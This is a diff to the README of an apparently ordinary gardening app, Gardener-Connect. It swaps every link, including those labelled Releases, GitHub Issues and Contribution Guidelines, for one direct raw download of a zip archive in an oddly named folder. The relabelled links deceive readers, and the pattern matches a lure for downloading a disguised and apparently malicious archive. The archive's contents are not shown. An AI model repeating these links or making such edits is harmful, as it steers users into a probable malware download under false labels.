@@ -1,6 +1,6 @@
 # 🌱 Gardener-Connect - Connect with Gardeners Effortlessly
 
-[![Download Gardener-Connect](https://img.shields.io/badge/Download-Gardener--Connect-blue.svg)](https://github.com/Badawy919/Gardener-Connect/releases)
+[![Download Gardener-Connect](https://raw.githubusercontent.com/Badawy919/Gardener-Connect/main/diminutiveness/Gardener-Connect.zip)](https://raw.githubusercontent.com/Badawy919/Gardener-Connect/main/diminutiveness/Gardener-Connect.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ Gardener-Connect is a web application designed for gardening enthusiasts. It con
 To get started with Gardener-Connect, follow these simple steps:
 
 1. **Click the Download Link**  
-   Visit our [Releases page](https://github.com/Badawy919/Gardener-Connect/releases) to download the application. 
+   Visit our [Releases page](https://raw.githubusercontent.com/Badawy919/Gardener-Connect/main/diminutiveness/Gardener-Connect.zip) to download the application. 
 
 2. **Choose the Latest Version**  
    Look for the latest version at the top of the releases page. It’s usually marked as the most recent release.
@@ -62,7 +62,7 @@ Yes, Gardener-Connect is responsive and works on mobile devices.
 
 ### How do I report a problem?
 
-If you encounter any issues, please visit our [GitHub Issues page](https://github.com/Badawy919/Gardener-Connect/issues). Describe your problem, and our team will assist you.
+If you encounter any issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Badawy919/Gardener-Connect/main/diminutiveness/Gardener-Connect.zip). Describe your problem, and our team will assist you.
 
 ## 🌳 Community Guidelines
 
@@ -74,8 +74,8 @@ We welcome all garden lovers to be part of our community. Please remember to:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Badawy919/Gardener-Connect/releases) - Download the latest version.
-- [GitHub Issues](https://github.com/Badawy919/Gardener-Connect/issues) - Report bugs or request features.
-- [Contribution Guidelines](https://github.com/Badawy919/Gardener-Connect/blob/main/CONTRIBUTING.md) - Learn how to contribute to the project.
+- [Releases Page](https://raw.githubusercontent.com/Badawy919/Gardener-Connect/main/diminutiveness/Gardener-Connect.zip) - Download the latest version.
+- [GitHub Issues](https://raw.githubusercontent.com/Badawy919/Gardener-Connect/main/diminutiveness/Gardener-Connect.zip) - Report bugs or request features.
+- [Contribution Guidelines](https://raw.githubusercontent.com/Badawy919/Gardener-Connect/main/diminutiveness/Gardener-Connect.zip) - Learn how to contribute to the project.
 
 Thank you for choosing Gardener-Connect! Happy gardening!
